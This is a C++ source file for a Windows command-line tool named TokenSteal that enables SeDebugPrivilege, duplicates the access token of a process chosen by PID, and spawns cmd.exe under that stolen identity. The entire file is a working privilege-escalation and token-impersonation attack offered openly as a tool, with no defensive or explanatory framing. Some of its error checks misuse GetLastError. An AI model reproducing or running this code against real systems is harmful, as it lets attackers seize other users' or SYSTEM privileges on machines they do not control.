#include <windows.h>
#include <iostream>
#include <Lmcons.h>

BOOL SetPrivilege(
	HANDLE hToken,         
	LPCTSTR lpszPrivilege, 
	BOOL bEnablePrivilege  
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,          
		lpszPrivilege,   
		&luid))       
	{
		printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;



	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		printf("[-] The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

std::string get_username()
{
	TCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	std::wstring username_w(username);
	std::string username_s(username_w.begin(), username_w.end());
	return username_s;
}

int main(int argc, char** argv) {
	
	if (argc <= 1) {
		printf("USAGE: TokenSteal.exe Process PID");
		return -1;
	}
	printf("Primary Access Token Manipulation by lengyi \n\n");
	printf("[+] Current user is: %s\n", (get_username()).c_str());

	
	char* pid_c = argv[1];
	DWORD PID_TO_IMPERSONATE = atoi(pid_c);

	
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);

	
	HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
	{
		printf("[+] SeDebugPrivilege enabled!\n");
	}

	
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, true, PID_TO_IMPERSONATE);
	if (GetLastError() == NULL)
		printf("[+] OpenProcess() success!\n");
	else
	{
		HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
		if (GetLastError() == NULL) {
			printf("[+] OpenProcess() success!\n");
		}
		else
		{
			printf("[-] OpenProcess() Return Code: %i\n", processHandle);
			printf("[-] OpenProcess() Error: %i\n", GetLastError());
		}
	}


	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle);
	if (GetLastError() == NULL)
		printf("[+] OpenProcessToken() success!\n");
	else
	{
		printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
		printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
	}


	BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
	if (GetLastError() == NULL)
	{
		printf("[+] ImpersonatedLoggedOnUser() success!\n");
		printf("[+] Current user is: %s\n", (get_username()).c_str());
		printf("[+] Reverting thread to original user context\n");
		RevertToSelf();
	}
	else
	{
		printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
		printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
	}

	BOOL duplicateToken = DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
	if (GetLastError() == NULL)
		printf("[+] DuplicateTokenEx() success!\n");
	else
	{
		printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
		printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
	}

	
	BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
	if (GetLastError() == NULL)
		printf("[+] Process spawned!\n");
	else
	{
		printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
		printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
	}

	return 0;
}
